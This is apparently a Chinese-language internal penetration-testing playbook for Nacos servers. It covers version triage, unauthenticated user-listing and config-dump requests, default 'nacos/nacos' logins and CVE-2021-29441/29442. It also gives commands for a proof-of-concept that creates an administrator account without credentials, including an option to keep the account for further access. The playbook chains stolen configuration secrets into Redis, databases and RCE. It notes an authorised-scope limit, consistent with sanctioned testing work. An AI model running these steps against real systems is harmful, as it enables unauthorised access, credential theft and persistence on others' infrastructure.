# Nacos 未授权与弱口令手法

> 指纹：`tools/1day-kit/custom-templates/nacos-unauth.yaml`  
> 常挂：`春府·关窍.md`（`nacos_config_chain`）  
> 情报对照：`CVE-2021-29441` / `CVE-2021-29442` 等历史未鉴权族  
> **Nacos 3.x 专卡（未授权建管理员）**：`杀招/纳言无门/` + `炼蛊房/nacos_authscope_poc.py`  
> 红线：仅 `授权范围`；改配置/加用户先问

## 0. 版本分流

| 版本 | 手法 | 入口 |
|------|------|------|
| < 2.x / 早期 3.x | v1 未鉴权 / `nacos/nacos` 弱口 | 本文 §2~§4 |
| **3.0.0 ~ 3.2.3** | **鉴权作用域错配：无凭证建管理员** | `nacos-authscope-unauth` Skill + `nacos_authscope_poc.py` |
| ≥ 3.2.4 | 已修复 authscope；仍查弱口 | 本文 §2 + Skill §1 探测 |

> 看到 `/v3/auth/user`、`/v3/auth/role`、`/v3/auth/permission` 先走 3.x 专卡：
> ```bash
> python3 炼蛊房/nacos_authscope_poc.py --host <授权IP> --check-only
> ```

## 1. 一句话

Nacos 控制台/OpenAPI **鉴权没开或可绕**，或默认 **`nacos/nacos`** 能登录 → 读配置（DB/Redis/Jasypt/下游）→ 回灌业务链。  
在本库里很少单独结案：多半是 **Gateway/Actuator 链的配置出口**。

---

## 2. 指纹触发

| 信号 | 路径/特征 |
|------|-----------|
| 控制台 | `/nacos` · `/nacos/` |
| 用户列表未鉴权 | `GET /nacos/v1/auth/users?pageNo=1&pageSize=9` 出 `pageItems` |
| 配置未鉴权 | `GET /nacos/v1/cs/configs?...` 出 `dataId`/`content` |
| 弱口令 | `POST /nacos/v1/auth/users/login` · `username=nacos&password=nacos` → `accessToken` |
| 端口 | 常 **8848**；内网扫描见 `纵横天下.md` |

```bash
python3 tools/1day-kit/od_kit.py nuclei --url https://授权站 --case <案卷> \
  --template-id nacos-unauth
# 若同案已有 Gateway
python3 tools/spring-gateway-killchain/bin/sgc_probe.py --base https://授权站 --out 案卷/.../sgc/
```

## 3. 档位与成功口径

| 档 | 动作 | 成功证据 |
|----|------|----------|
| **L1 暴露** | 控制台/API 指纹 | 确认 Nacos |
| **L2 读配置** | 未授权或弱口令列配置 | 明文/ENC 配置落盘 |
| **L3 回灌** | Jasypt 解 / 打 Redis·DB·下游 | 业务可验证（登录/数据/RCE）；走 Gateway Playbook F/G |

历史 CVE 作对照（版本旧时）：`CVE-2021-29441`（User-Agent 鉴权绕过等）——先看当前是否仍未开 auth，再查具体 CVE。

## 5. Nacos 3.x 专项（authscope 错配）

> 完整手法见 `杀招/纳言无门/SKILL.md`

```bash
# 无损探测（只读）
python3 炼蛊房/nacos_authscope_poc.py --host <IP> --check-only

# 完整利用链（建号→绑角→发权→登录→读写配置→自动清理）
python3 炼蛊房/nacos_authscope_poc.py --host <IP> --case <案卷>

# 保留账号继续回灌
python3 炼蛊房/nacos_authscope_poc.py --host <IP> --case <案卷> --no-cleanup
```

退出码 0 = 漏洞存在且链跑通；2 = 已修复。证据落 `exports/<案卷>/nacos/`。
